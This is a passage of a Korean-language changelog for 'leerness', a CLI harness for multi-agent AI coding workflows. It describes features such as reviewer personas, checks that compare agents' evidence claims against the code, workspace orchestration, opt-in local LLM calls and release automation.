- Gemini CLI 외부 호출 (yolo 모드) → rpg-stats 통계 대시보드 자동 생성 (13/13, HTML 5.5KB)
- → 3 도메인 동시 진행, 메인 에이전트가 외부 CLI를 sub-agent처럼 활용

## 1.9.29 — 2026-05-15

**페르소나 시스템 — 5종 내장 + `leerness review --persona` (도메인 깊이 3-4배)**.

이전 라운드 sub-agent 4명 비교 실험에서 검증: 도메인 페르소나 부여 시 발견율 100% vs control 30%, 토큰 비용은 ~3%만 증가.

### Added

- **`leerness persona list|show <id>|add <id>`**: 페르소나 카탈로그 관리.
  - **내장 5종**:
    - `security` — 10년차 시니어 보안 엔지니어 (OWASP/CWE/RFC, 한국 개인정보보호법/게임산업법)
    - `performance` — V8 엔진 내부 (hidden class/GC/이벤트 루프) 전문가
    - `ux` — 한국어 UX 라이터 + DX 컨설턴트 (토스/카카오/Stripe/GitHub)
    - `testing` — TDD + property-based 테스트 엔지니어 (fast-check)
    - `docs` — 한국어 기술 문서 작성자 (Stripe Docs/카카오 dev)
  - **사용자 정의**: `leerness persona add my-domain` → `.harness/personas/my-domain.md` 템플릿 생성
- **`leerness review <file> --persona <id1,id2,...>`**: 파일 + 페르소나 본문을 결합한 sub-agent 프롬프트 자동 생성. 단일/다중 페르소나 모두 지원.

### Why
페르소나 미부여 sub-agent는 코드를 표면적으로만 리뷰 (보안 30% + 성능 20% + UX 10%). 페르소나 부여 시 각 도메인 100% 발견율. 다중 페르소나 동시 spawn으로 종합 커버리지 가능.

### Implementation
- 내장 페르소나는 harness.js의 `BUILT_IN_PERSONAS` 객체로 패키지 내 보관 — 별도 설치 불필요.
- 사용자 정의 페르소나는 `.harness/personas/<id>.md` 파일로 검색 (커밋 가능).
- LLM 자동 호출 없음 — 프롬프트 생성만, 실 호출은 Claude Code/Codex/Gemini 등에서.

### Migration
```bash
npx leerness@latest update . --yes
leerness persona list
leerness review src/api.js --persona security,performance,ux
```

## 1.9.28 — 2026-05-15

**낙관적 표시 정밀도 fix — 한국형 PG 패턴 + confidence floor 0.15**.

1.9.27 sub-agent 검증에서 발견한 두 한계점을 작은 patch로 보완.

### Fixed
- **Payment 패턴 확장** — 카카오페이/네이버페이/페이팔 한국·국제 PG 추가 (`evidenceRe`/`codeRe`).
- **Confidence floor 0.15** — 1.9.27의 단일 high suspect 케이스 일률적 confidence=0 → 0.15로 floor 적용해 다중 의심과 정량 차등 가능.

### Why
- 한국 사용자의 결제 evidence ("카카오페이 결제 승인 완료" 등)가 1.9.27에선 일부만 감지. 이제 모든 한국형 PG 정확 매칭.
- confidence=0/0/0 일률성 해소 → "단일 의심도 정량 차이" 표현 가능.

### e2e
139/139 PASS (138 + 1.9.28 신규 1)

## 1.9.27 — 2026-05-15

**낙관적 표시 방지 강화 — URL/메서드 단위 매핑 + 10 카테고리 + 신뢰도 점수**.

1.9.26의 sub-agent B 검증에서 발견한 false negative (T-9001 "POST /users" 케이스, 같은 프로젝트에 다른 목적의 http.request 있으면 통과)를 정확히 해결.

### Added

- **URL/메서드 단위 매핑** (1.9.27 핵심): evidence에서 `POST /users` 같은 구체 경로 추출 → 코드에서 같은 경로 호출 검사. 1.9.26의 "fetch 키워드 존재" 약한 신호 → "실제 경로 일치" 강한 신호.
- **카탈로그 확장 5→10 카테고리**: FileIO / Queue / Cache / Notify(Slack/Discord) / Storage(S3/GCS/Azure) 신규.
- **신뢰도 점수** (0.0~1.0): high (1.0 가중치) + medium (0.5 가중치) 의심을 evidence 주장 수로 나눠 신뢰도 산출. < 0.5 = ⚠ 낮음, < 0.9 = ⓘ 보통, ≥ 0.9 = ✓ 높음.

### Why
1.9.26 sub-agent B 검증에서 발견:
- T-9001 evidence "POST /users API 호출 완료" + 같은 프로젝트에 다른 목적의 `http.request({path: '/api/tags'})` 존재 → 1.9.26은 "API 카테고리 통과"로 false negative
- 1.9.27 URL 매핑: "POST /users" 추출 후 코드에서 `/users` 검색 → 미발견 → 의심 감지 (MED severity)

### Limitations (1.9.28 후보)
- AST 분석 여전히 미구현 — 단순 substring 매칭의 한계
- URL 매핑이 path만 — query string, header 검증 없음
- 패턴 카탈로그 10종으로 확장됐지만 도메인 특화 패턴 (GraphQL, gRPC) 미커버

### Migration
```bash
npx leerness@latest update . --yes

# 강화된 명령 사용
leerness optimism-check T-0001 --path . --json   # 신뢰도 점수 포함
leerness verify-claim T-0001 --strict-claims     # 통합 검사
```

## 1.9.26 — 2026-05-15

**낙관적 표시 방지 — `optimism-check <T-ID>` + `verify-claim --strict-claims`** (사용자 명시 요구사항).

API 연동/DB 저장/이메일 발송 등 외부 작용을 evidence에 적었는데 실제 코드에 호출 흔적이 없는 "낙관적 표시"를 정적 분석으로 자동 감지.

### Added

- **`leerness optimism-check <T-ID> [--json]`**: progress-tracker의 evidence를 5종 패턴(API/DB/Email/Webhook/Payment)으로 스캔 → 주장이 있으면 코드 본문(`src/`, `bin/`, `lib/`, `scripts/`)에 호출 흔적 검사 → 불일치 발견 시 `exit 1`.
- **`leerness verify-claim --strict-claims`**: 기존 verify-claim 출력에 낙관적 표시 검사 결과 통합. 의심 발견 시 종합 FAIL.
- 5종 패턴 카탈로그:
  - **API**: `API 호출 / HTTP \d{3} / POST \/ / fetch / endpoint` ↔ `fetch( / http.request / axios. / undici / got.`
  - **DB**: `DB에 저장 / insert N건 / 데이터베이스 / migration` ↔ `db. / pg. / mongoose. / prisma. / sequelize`
  - **Email**: `이메일 발송 / sendMail` ↔ `sendMail / nodemailer / smtp / @sendgrid`
  - **Webhook**: `웹훅 호출` ↔ `fetch / http.request / axios.`
  - **Payment**: `결제 완료 / stripe / toss` ↔ `stripe / toss / tosspayments`

### Why
1.9.18~1.9.25의 verify-claim은 파일·테스트 카운트만 검증. 외부 작용(API/DB) 주장은 못 잡음. 1.9.26은 정적 분석으로 1차 방어선 추가.

### Limitations (1.9.27 후보)
- 같은 프로젝트가 다른 목적으로 동일 키워드(예: `http.request`)를 쓰면 false negative. URL/메서드 단위 매핑 필요.
- AST 분석 없는 substring 매칭. 호출 위치(call site) vs evidence 청크 매핑 필요.
- 파일 I/O, 메시지 큐(rabbitmq/kafka), 결제 PG 추가 필요.

### Migration
```bash
npx leerness@latest update . --yes

# 사용 예
leerness optimism-check T-0001
leerness verify-claim T-0001 --run-tests --strict-claims
```

## 1.9.25 — 2026-05-15

**모순 감지 0/5 → 5/5 — 소스 코드 인덱싱 + 멀티 세션 in-progress 즉시 등록**.

이전 1.9.24 실측에서 발견한 "코드는 있는데 progress-tracker에 등록 안 된 상태" 사각지대를 두 가지 신규 명령으로 보완.

### Added

- **`leerness memory search "키" --include-code`** (후보 A): `.harness/*.md` 외에 `src/`, `tests/`, `bin/`, `lib/`, `scripts/` 폴더의 `.js/.ts/.gd/.cs/.py/.rb/.go/.rs/.md/.html/.css/.json` 본문도 검색. 모순 감지 핵심.
- **`leerness brainstorm "주제" --include-code`** (후보 A 확장): 단일/워크스페이스 모드 모두에서 코드 hits 별도 섹션 (`💻 코드`)으로 표시.
- **`leerness register-pending "<요청>"`** (후보 B): 다중 세션/모델이 작업 시작 즉시 progress-tracker에 in-progress T-row를 등록. `--agent <name> --note <text>` 옵션. 다른 세션이 즉시 발견 가능 → 중복/모순 작업 방지.

### Why
1.9.24까지: Gemini가 워크스페이스 직접 수정 (toJson 추가)했지만 progress-tracker에 등록 전엔 다른 세션이 발견 못함 (0/5 fail). 1.9.25:
- 소스 코드 인덱싱으로 즉시 발견 가능 (실측: `memory search "toJson" --include-code` → **0 → 15 matches**)
- `register-pending`으로 작업 시작 시점 즉시 신호 발신

### Migration
```bash
npx leerness@latest update . --yes

# 다중 세션 / 외부 모델 워크플로 (Gemini/Codex/Claude)
leerness handoff --compact > /tmp/ctx.txt
# 외부 모델에 컨텍스트 + 작업 부여
gemini -p "$(cat /tmp/ctx.txt)\n작업: ..." --yolo

# 모순 감지 (코드 검색 포함)
leerness memory search "키워드" --include-code
leerness brainstorm "주제" --all-apps --include-code
```

## 1.9.24 — 2026-05-14

**`leerness deps <capability>` — depends-on 그래프 역방향 추적 + 자동 회귀 sweep**.

오래된 작업 재진행 시 / 핵심 모듈 변경 시 영향받는 모듈을 자동 식별 + 해당 프로젝트의 `npm test`를 일괄 실행.

### Added

- **`leerness deps <capability>`**: 워크스페이스 모든 `reuse-map.md`의 depends-on 엣지를 역방향 추적해 해당 capability를 의존하는 모든 capability와 프로젝트를 식별. 1-hop(직접 의존) + 2-hop(전이 의존) 모두 표시.
- **`leerness deps <capability> --run-tests`**: 영향받는 N개 프로젝트의 `npm test`를 자동 일괄 실행. 회귀 발견 시 어느 프로젝트인지 즉시 보고 + `exit 1`. CI 통합용 `--json`.
- 실측: `leerness deps Character --all-apps --run-tests` 실행 시 rpg-core의 `Character` capability에 의존하는 **6 프로젝트(8 capability) 자동 식별 + 6/6 npm test 자동 일괄 실행**.

### Why
오래된 작업을 재진행하거나 핵심 모듈을 변경할 때, 영향받는 다른 프로젝트를 수동으로 grep하던 패턴을 1 명령으로 자동화. depends-on 그래프(1.9.18부터 수집)가 활용됨.

### Migration
```bash
npx leerness@latest update . --yes
# 사용 예
leerness deps Character --all-apps --run-tests
```

## 1.9.23 — 2026-05-14

**Install 사용성 개선 — `preferGlobal` + `main` 필드 + README 상단 Install 섹션**.

npmjs.com 페이지가 자동 표시하는 `npm i leerness`만 따라 했을 때 `leerness` 명령이 PATH에 없어 실패하던 문제를 안내로 보완.

### Changed
- `package.json` — `preferGlobal: true` (npm이 사용자에게 전역 설치 권장 메시지 출력) + `main: "bin/harness.js"` (라이브러리 import도 가능)
- `README.md` — 최상단에 **⚙️ 설치 (Install)** 섹션 추가. 3가지 옵션 명시:
  1. `npx leerness@latest ...` (추천, 설치 불필요)
  2. `npm i -g leerness` (전역 설치)
  3. `npm i --save-dev leerness` + `npx leerness ...`

## 1.9.22 — 2026-05-14

**Ollama 로컬 LLM 통합 (opt-in 전용) — handoff --compact + orchestrate --agents N + llm-bench record**.

LLM 벤치마크에서 확인된 4가지 개선점 통합. **opt-in 정책 엄수**: 사용자가 leerness 적용 프로젝트에서 로컬 LLM 사용을 원치 않을 수 있어 자동 활성화 금지.

### Added

- **`leerness handoff --compact`** (후보 1): 4KB 출력을 ~500자 1-3줄로 압축. LLM 시스템 프롬프트 주입용. 핵심: 진행률 + 프로젝트 1줄씩 + 핵심 규칙 1줄.
- **`leerness orchestrate "<목표>" --agents N`** (후보 3, 사용자 정책 명시):
  - **Opt-in 전용**: `LEERNESS_OLLAMA_BASE_URL` 환경변수 감지 시에만 활성화. 미설정 시 명령 거부 + 한국어 안내. **LLM 자동 호출 절대 금지**.
  - `.env` 파일 자동 로드 (간단 파서).
  - `--agents N` 가변 (1~256). 사용자 요구 "10/20개 등 늘어날 수 있음" 반영.
  - `--model` 선택, `--retry-on-fail K`(후보 2 통합), Promise.all 병렬.
  - 실측: 10 agent에서 5.5× 병렬 효과.
  - `.harness/orchestrate-log.md` 자동 누적.
- **`leerness llm-bench record`** (후보 4): `.harness/llm-bench-history.md`에 표 누적.
- **`.env.example`**: `LEERNESS_OLLAMA_BASE_URL=` + `LEERNESS_OLLAMA_MODEL=` + opt-in 정책 한국어 주석.

### Policy (사용자 명시)
- ❌ 환경변수 없이 LLM 자동 호출 금지
- ✅ 환경변수 감지 시에만 활성화 (사용자 동의 표명으로 간주)
- ✅ sub-agent 수는 사용자가 결정 (`--agents` 가변)

## 1.9.21 — 2026-05-14

**verify-claim 도메인 확장 hot fix** — `.cfg`/`.ini`/`.env`/`.toml`/`.lock`/`.conf`/`.properties` 추가.

## 1.9.20 — 2026-05-14

**verify-claim 정확도 + 도메인 확장 — Godot/jest/mocha 지원, verify-code --bench**.

1.9.19를 실전 RPG 워크스페이스에 쓰면서 발견한 3가지 한계를 모두 보완. **Round 4 (rpg-godot) 작업에서 실제로 false negative 발생**한 케이스가 동기.

### Added / Changed

- **`verify-claim` file path 인식 확장**: 1.9.19까지는 `src/bin/tests/public/lib` prefix만 인식 → Godot의 `scenes/*.tscn`, `scripts/*.gd`, 루트 `project.godot` 등 미검출. 1.9.20부터 **확장자 화이트리스트 기반**으로 변경. dir prefix는 optional, 확장자는 길이 내림차순 정렬로 `.ts` vs `.tscn` 정확히 구분.
  - 신규 지원 확장자: `tscn / tres / godot / gd / cs / py / rb / go / rs / kt / sh / mdx / json5 / yaml / scss / sass / less / gltf / dockerfile / webmanifest` 등
- **`verify-claim --run-tests` stdout 파싱 확장**: 1.9.19까지는 `X/Y 통과/passed/pass` 만 인식. 1.9.20부터 **jest** (`Tests: 12 passed, 12 total`), **mocha** (`7 passing`), **tap** (`# pass 5`) 형식도 자동 인식. evidence 컬럼 파싱에도 동일 패턴 적용.
- **`verify-code --bench`**: `package.json#scripts.bench`가 있으면 추가 실행. 성능 metric을 `.harness/review-evidence.md`에 자동 누적. 1.9.19에서 별도 `perf record` 명령 추가 대신 기존 verify-code 확장으로 통합 — 의존성 0, 워크플로 일관.

### Why
- 1.9.19를 사용한 RPG 워크스페이스에서 `verify-claim T-0002 --path _apps/rpg-godot` 실행 시 evidence "project.godot + scenes/main.tscn + scripts/network.gd + scripts/main.gd"가 0건 검출. 1.9.20에서 **4/4 모두 정확 검출** 확인.
- 외부 npm 패키지가 jest/mocha를 쓰는 경우 evidence나 stdout이 한국어가 아니어도 자동 인식.
- 부하 측정 같은 동적 metric을 회고에서 추적 가능하도록 evidence 누적 채널 확장.

### Migration
```bash
npx leerness@latest update . --yes
```

## 1.9.19 — 2026-05-14

**1.9.18 후속 다듬기 — verify-claim에 동적 실행, --strict-elements 정확도 강화**.

1.9.18을 실전 sub-agent 검수에 쓰면서 발견한 두 가지 가공할 점을 마저 보완.

### Added

- **`leerness verify-claim --run-tests`**: 정적 점검(파일 존재 + 테스트 카운트)에 더해 `npm test`를 동적으로 실행. stdout에서 `X/Y passed` 패턴을 파싱해 evidence 주장과 비교. 주장이 `5/5 통과`인데 실제 `3/5`면 exit 1. `--json`에 `run.parsed`, `verdict.declaredPassMatches` 포함.
- **`--strict-elements` 출력 강화**: 같은 함수명이라도 (a) 같은 파일이면 `⚠ 진짜 중복 가능`, (b) 다른 파일이면 `ℹ 의도 분리 가능` (예: 모듈 함수 vs CLI 명령)으로 분류. 1.9.18의 평면 출력보다 false positive 식별이 쉬워짐.

### Why
- `verify-claim`만으로는 "파일이 있고 check() 호출이 많다" 정도까지만 보장. `--run-tests`가 추가되면 메인 에이전트가 sub-agent의 evidence를 **한 번의 명령으로 정적+동적 모두 검증**.
- 1.9.18 `--strict-elements`가 city-insights의 `MemoStats`/`StatsCli`(둘 다 `stats()` 함수, 다른 파일) 같은 의도된 분리를 잠재 중복으로 평면 표시 → 사용자가 직접 판별해야 했음. 1.9.19에선 정보를 더 줘서 즉시 분류 가능.

### Migration
```bash
npx leerness@latest update . --yes
```

## 1.9.18 — 2026-05-14

**오케스트레이션 검수 패키지 — `--since` 시간 필터 + `--strict-elements` 잠재 중복 + `depends-on` 그래프 + `verify-claim` 자동 검증**.

1.9.17의 워크스페이스 모드를 실전 멀티 에이전트 작업에서 사용하다 발견한 4가지 갭을 모두 보완합니다. 검수 자동화에 초점.

### Added

- **`leerness handoff --since <duration>`**: `24h` / `3d` / `1w` / `30m` 형식. 해당 기간 내 수정된 T-row에 🆕 마크 + 별도 "최근 변경" 섹션. sub-agent들이 방금 무엇을 추가했는지 한눈에.
- **`leerness reuse-map --strict-elements`**: element 컬럼에서 함수명 추출 (`src/build.js (escapeHtml)` → `escapeHtml`), **다른 capability 이름인데 같은 함수**를 잠재 중복으로 감지. 명명 일관성 검사용.
- **`reuse-map` depends-on 표기**: notes 컬럼에 `depends-on: A, B` 표기 시 자동 추출해 의존 그래프로 표시. 단일/워크스페이스 모두 지원. JSON에 `dependsEdges` 포함.
- **`leerness verify-claim <T-ID>`**: progress-tracker의 evidence 컬럼 자동 파싱 — 주장한 파일 경로 존재 확인, 주장한 테스트 수 vs 실제 `check()/test()/it()` 호출 수 대조. 불일치 시 `exit 1`. CI 통합용 `--json`.

### Why
멀티 에이전트 병렬 작업 검수 시 메인 에이전트가 매번 수동으로 `wc -l`, `grep`, `npm test`를 돌리고 있었음. 1.9.18은 그 패턴을 하나의 명령으로 자동화:
- "지금 sub-agent들이 뭘 추가했지?" → `handoff --all-apps --since 1h`
- "같은 함수를 두 번 만든 거 아닌가?" → `reuse-map --all-apps --strict-elements`
- "이 에이전트의 evidence가 진짜인가?" → `verify-claim T-0008`

### Migration
```bash
npx leerness@latest update . --yes
```

## 1.9.17 — 2026-05-14

**워크스페이스 오케스트레이션 — `handoff --all-apps` + `reuse-map --all-apps` + 중복 capability 감지**.

멀티 에이전트 병렬 작업 시 메인 에이전트가 한 번의 명령으로 모든 sub-agent의 진행 상태를 파악하고, 새 패턴이 다른 프로젝트와 중복되는지 즉시 검증할 수 있습니다.

### Added

- **`leerness handoff --all-apps` / `--include`**: 워크스페이스 전체의 진행 상태(WIP/blocked/다음 작업)를 한 화면에 출력. 4개 sub-agent가 병렬로 일할 때 메인 agent의 상황 인식용. `--json`도 지원.
- **`leerness reuse-map [path]`**: 단일 프로젝트의 reuse-map.md 파싱 출력.
- **`leerness reuse-map --all-apps` / `--include`**: 다수 프로젝트의 모든 capability를 모아 **동일 이름 capability를 자동 중복 감지**. 재사용/공통 모듈 추출 기회 식별. `--json`도 지원.

### Why
1.9.16까지의 `retro --all-apps`는 누적 회고용. 1.9.17은 **실시간 오케스트레이션용**: "지금 어떤 에이전트가 무엇을 하고 있고, 새 패턴이 다른 프로젝트와 겹치는가?"에 답합니다.

### Migration
```bash
npx leerness@latest update . --yes
```

## 1.9.16 — 2026-05-13

**brainstorm 워크스페이스 통합 + 3 명령 JSON export + session close 워크스페이스 안내**.

### Added

- **`leerness brainstorm "<주제>" --all-apps` / `--include`**: retro/insights에 이어 brainstorm도 다수 프로젝트 통합 검색. 프로젝트별 결과 요약 + 워크스페이스 총합.
- **`--json` 옵션** (retro / insights / brainstorm, 단일/워크스페이스 모두): JSON으로 export. CI/대시보드 연동 가능.
- **session close 끝에 워크스페이스 안내**: `_apps/*/` 또는 부모 `_apps/*/`에 다른 leerness 프로젝트가 있으면 `🌐 워크스페이스에 N개 — leerness retro --all-apps` 자동 안내.

### Migration
```bash
npx leerness@latest update . --yes
```

## 1.9.15 — 2026-05-13

**브레인스토밍 출처 표시 + 워크스페이스 통합 회고/통찰**.

### Added

- **brainstorm 매치 위치 표시**: 모든 결과에 `.harness/<file>:<line>` 형식의 파일 경로 + 줄 번호. task 결과는 매치된 필드(request/evidence/nextAction)도 함께 표시.
- **`leerness retro --all-apps`**: 현재 디렉토리 + `_apps/*` (또는 부모 `_apps/*`)의 모든 leerness 프로젝트를 통합 회고. 프로젝트별 한 줄 요약 + 다음 우선 작업 + top 스킬 + 워크스페이스 총합 (task / done % / 결정 / 스킬 / 사용 / 최적화 / pass-fix 비율).
- **`leerness retro --include <p1,p2,...>`**: 명시 경로 통합 회고. 쉼표 구분 다중 경로 지원.
- **`leerness insights --all-apps`** / **`--include`**: 통합 통계를 표 형식으로 출력 + 안정성 평가 + 최적화 권장.

### Migration

```bash
npx leerness@latest update . --yes
```

기존 명령은 모두 호환. `--all-apps` / `--include`는 선택 옵션.

## 1.9.14 — 2026-05-13

**1.9.13의 retro/brainstorm 정확도 4건 fix** (city-insights 대형 프로젝트 운영 중 발견).

### Fixed

- **A. decisions Template 카운트 오류**: init이 만드는 `decisions.md`의 `### YYYY-MM-DD — Decision` 템플릿 예시가 실제 결정으로 잘못 카운트되던 문제. `_extractDecisionBlocks()` 헬퍼가 코드블록(```...```) 안의 ### 와 `### (Template|템플릿)` 시작 블록을 자동 제외.
- **B. brainstorm 토큰 매칭 부정확**: 단순 substring 매치로 인해 무관한 task가 잡히던 문제. **유니코드 word boundary** (`(?<![\p{L}\p{N}_])…(?![\p{L}\p{N}_])`) 기반 토큰 매칭으로 변경. 다중 토큰 (예: `"API rate limit"`)은 **모두** 매치되어야 결과로 표시.
- **C. retro 다음 우선 작업이 planned 미포함**: in-progress/blocked가 비어있으면 "(없음)"으로 표시되던 문제. 우선순위 가중치 (in-progress=0, blocked/waiting/on-hold/incomplete=1, planned/requested=2)로 정렬해 planned도 포함.
- **D. decisions.md 템플릿 형식**: init 디폴트가 실 결정과 동일한 `### YYYY-MM-DD — Decision` 형식이라 retro 카운트와 충돌. 템플릿을 **명시적 ```` ```md ```` 코드블록**으로 감싸 표시. retro/brainstorm/lessons가 일관되게 무시.

### Migration

```bash
npx leerness@latest update . --yes
```

기존 프로젝트의 decisions.md는 그대로 두면 자동으로 정확히 카운트됩니다 (코드블록 처리는 양쪽 모두 동작).

## 1.9.13 — 2026-05-13

**회고·통찰·브레인스토밍** — 누적된 leerness 데이터에서 자동으로 패턴/추세/주제별 자원을 추출.

### Added — 3 신규 명령

- **`leerness retro [path] [--days 7]`** — 회고
  - 작업 상태 분포 / 다음 우선 작업 / 스킬 활용 추세 / 최근 결정 / **검증 시간 추세** / 룰 검증률 / fix↔pass 시그널 비율 / 권장 다음 단계
- **`leerness insights [path]`** — 누적 통계
  - 핵심 지표 / top 스킬 / 검증 시간 통계 / 안정성 (pass÷fix 비율) / 권장
- **`leerness brainstorm "<주제>"`** — 주제 기반 자원 회수
  - decisions / skills / tasks / rules / evidence에서 매칭 → 관련 과거 실패(lessons) 포함 → 시작 전 권장 액션

### Added — 자동 회고

- `session close`가 매번 끝에 **한 줄 요약** 자동 출력: `완료 N/M (X%) · 스킬 N종 사용 K회 · 검증 변화 ±X% · 결정 N건 누적`
- **5세션마다** 자동 깊은 회고 실행 (`.harness/cache/session-counter.json`로 카운팅)
- 다음 깊은 회고까지 남은 세션 수 안내

### Added — 자연어 매핑 (AGENTS.md/CLAUDE.md)

| 사용자 발화 | 즉시 실행 |
|---|---|
| "회고해줘" / "돌아보자" | `leerness retro` |
| "통계 / 누적 지표" | `leerness insights` |
| "X 브레인스토밍 / X 검토" | `leerness brainstorm "X"` |

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 마이그레이션. 이후 session close부터 한 줄 요약 자동 출력.

## 1.9.12 — 2026-05-13

**`leerness roadmap` 자동 생성·갱신** — 3개 트리거.

### Added — 자동 roadmap

- **`install` 직후 자동 생성**: `npx leerness init .` 끝에 첫 `roadmap.html` 자동 생성. `--no-auto-roadmap`으로 끔.
- **`session close` 끝 자동 갱신**: `leerness session close .` 마지막에 자동 갱신 출력 라인(`✓ roadmap.html 자동 갱신 (session-close)`).
- **데이터 변경 즉시 갱신** (옵트인): `--on-every-change`로 켜면 `task add/update/drop`, `plan add`, `rule add/pause/resume` 등이 호출될 때마다 즉시 갱신.

### Added — `leerness roadmap auto on|off|status`

- `roadmap auto on [--on-every-change] [--out file.html]` — 활성화 + 옵션 조정
- `roadmap auto off` — 비활성화 (수동 `leerness roadmap`만 작동)
- `roadmap auto status` — 현재 설정 표시 (enabled / onEveryChange / outFile / 트리거별 활성 여부)
- 설정 파일: `.harness/cache/auto-roadmap.json`
- 환경변수 옵트아웃: `LEERNESS_NO_AUTO_ROADMAP=1`

### Default

신규 init은 **enabled=true / onEveryChange=false**. 가장 자연스러운 워크플로우:
1. `leerness init . --skills recommended` → 첫 roadmap.html 즉시 생성
2. 작업 → session close → 자동 갱신
3. 변경이 많아 즉시 갱신을 원하면 `roadmap auto on --on-every-change`

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 마이그레이션. 이후 첫 session close부터 자동 갱신.

## 1.9.11 — 2026-05-12

**`leerness roadmap` 명령 통합 + `project-roadmap-generator` 스킬 기본 추천 + 화이트보드/토큰/상하 중앙정렬**.

### Added — `leerness roadmap [path] [--out file.html]`

`project-roadmap-generator` 로직을 leerness 본 패키지에 통합. 외부 의존성 없이 즉시 사용 가능.

- 좌→우 수평 트리 (project → milestones → tasks → skills/rules)
- **상하 중앙정렬**: 각 column의 노드들이 캔버스 세로 중앙 기준으로 균등 분포
- **디자인 토큰 자동 주입**: `.harness/design-system.md`의 Tokens 표 + 프로젝트 `styles/tokens.css`의 CSS 변수를 HTML `:root`에 `--lr-*`로 주입 (h1·card·border·dot 색상이 사용자 토큰을 따름)
- **화이트보드**: 드래그 panning, 휠 zoom (마우스 포인터 중심), 더블클릭 reset, +/-/⟳ 컨트롤 버튼
- 7개 상태 (완료/진행/보류/검토/예정/미완료/오류) + 스킬/룰 색상
- Milestones, 예정 작업, 보유 스킬, 활성 룰, 최근 결정, 디자인 토큰 6개 섹션 통합

### Changed — `recommended` 스킬에 자동 포함

`leerness init . --skills recommended` 호출 시 `project-roadmap-generator` 스킬이 기본으로 설치됩니다 (기존 4종 + 1). 별도 설치 불필요.

```
recommended = ['office','commerce-api','ai-verified-skill-publisher','feature-implementation','project-roadmap-generator']
```

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 즉시 자동 마이그레이션됩니다. `leerness roadmap`이 바로 사용 가능합니다.

## 1.9.10 — 2026-05-12

**leerness-skillpack 분리 + release publish 강화 (git remote 자동 감지 + GitHub Release + gh-pages 배포)**.

### Changed — 스킬 카탈로그 동적 로드

- `leerness-skillpack`이 npm에 별도 패키지로 분리됨. leerness 본 패키지는 `_tryLoadSkillpack()`으로 다음 순서로 동적 로드:
  1. `require('leerness-skillpack/catalog.json')` 시도
  2. `<cwd>/node_modules/leerness-skillpack/catalog.json` 탐색
  3. `npm root -g`의 `leerness-skillpack/catalog.json` 탐색
  4. `LEERNESS_SKILLPACK_PATH` 환경변수 경로
  5. 모두 실패 시 leerness 본 패키지의 내장 fallback (1.9.x 호환 유지)
- `leerness init` 출력에 `Skill catalog source: skillpack v1.0.0 | builtin (fallback)` 안내.
- `leerness skill list` 헤더에 카탈로그 출처 + 출처 컬럼에 `skillpack` / `builtin` / `user` 표시.

### Added — release publish 강화

- `detectGitRemote(root)`: 현재 디렉토리의 `git remote -v origin` 자동 감지 + GitHub owner/repo 추출.
- `leerness release publish` 신규 플래그:
  - `--auto` — remote 있으면 자동 `git push` (편의)
  - `--gh-release` — gh CLI로 GitHub Release 자동 생성 (`v<version>` 태그 + 자동 노트 + tarball 첨부)
  - `--gh-pages` — `gh-pages` branch에 정적 파일 자동 배포 (orphan 또는 기존 branch). 기본 소스는 `roadmap.html`, `--gh-pages-src <file>` 또는 `--roadmap <file>`로 지정.
  - `--pack` — npm pack만 명시적 실행
- `gh-pages` 배포는 임시 git worktree로 처리해 현재 작업 트리에 영향 없음. 배포 후 `https://<owner>.github.io/<repo>/` URL 안내.

### Migration

기존 1.9.x 사용자는 `npx leerness@latest update . --yes`로 즉시 자동 마이그레이션됩니다. leerness-skillpack은 선택 설치:

```bash
npm install leerness-skillpack    # 본 카탈로그 사용
# 또는 그대로 두면 leerness 내장 fallback이 동작 (기존과 동일)
```

## 1.9.9 — 2026-05-12

- 1.9.9 빌드 + GitHub 배포

**1.9.8 시연 중 자체 도그푸드(dogfood)로 빌드된 패치 — 룰 시스템이 정확히 작동한 증거**.

### Fixed
- `nonFlagArgs()`의 `withValue` set에 `--trigger`, `--check`, `--set`, `--min-score` 추가. 이전에는 `rule add "..." --trigger every-update` 호출 시 `every-update`가 description 끝에 합쳐져 등록되던 작은 버그.

### Demonstrated (자체 도그푸드)
- 메인 디렉토리에 사용자 자연어 룰 3종 (버전 bump / CHANGELOG 추가 / 배포 안내) 등록
- `leerness handoff`가 active rules 자동 노출 ✓
- `leerness rule pause R-0003` → handoff에서 R-0003 사라짐 ✓
- `leerness release bump --patch` → 1.9.8 → 1.9.9 자동 ✓
- `leerness release note "..."` → 이 CHANGELOG 항목 자동 작성 ✓
- `leerness session close`가 룰 검증 (`✓ pass / ⓘ manual / ○ baseline`) 자동 보고 ✓

## 1.9.8 — 2026-05-08

**자연어 룰 등록 + 매 세션 자동 노출·검증 + 코드로 자동화 가능한 release 명령군**.

### Added — User Rules

- `.harness/rules.md` — 사용자 정의 영구 룰의 단일 출처. AGENTS.md mandatory read order 10번에 자동 포함.
- `leerness rule add "<설명>" --trigger every-session|every-update|every-commit|session-start|session-close|pre-publish` — 룰 등록.
- `leerness rule list / verify / pause <id> / resume <id> / remove <id> / stop / resume-all` — 룰 라이프사이클.
- `leerness handoff`가 **active rules를 매 세션 시작 시 자동 출력** (사용자 중지 요청 전까지).
- `leerness session close`가 **활성 룰별 자동 검증 결과 (`✓ pass / ⓘ manual / ⓿ pending / ○ baseline`) 자동 보고**.

### Added — 자연어 룰 처리 지시 (AGENTS.md / CLAUDE.md)

사용자가 자연어로 "매 X마다 Y를 해줘"라고 말하면 AI 에이전트가 즉시 `leerness rule add` 명령을 호출하도록 매핑 표를 추가:

| 자연어 | leerness 명령 |
|---|---|
| "매 업데이트마다 버전 bump" | `rule add "버전 patch bump" --trigger every-update` |
| "매 커밋마다 패치노트" | `rule add "패치노트 추가" --trigger every-commit` |
| "세션 종료마다 배포" | `rule add "배포" --trigger session-close` |
| "X 룰 중지/그만" | `rule pause <id>` |
| "X 룰 제거" | `rule remove <id>` |
| "모든 룰 중지" | `rule stop` |

### Added — release 명령군 (자동화 가능한 룰의 실행 도구)

- `leerness release bump [--patch|--minor|--major]` — `package.json#version`과 `.harness/HARNESS_VERSION` 자동 bump.
- `leerness release note "<내용>"` — CHANGELOG.md에 자동 추가 (같은 버전이면 항목만, 새 버전이면 헤더+항목).
- `leerness release publish [--dry-run] [--git-push] [--npm-publish]` — npm pack + (선택) git push + (선택) npm publish 통합.

### Added — 룰 자동 검증 휴리스틱

`session close`가 매번 자동 수행:
- **version / 버전 / bump 키워드 룰** → `package.json` version이 baseline 캐시 대비 갱신됐는지.
- **changelog / 패치노트 키워드 룰** → CHANGELOG.md mtime이 갱신됐는지.
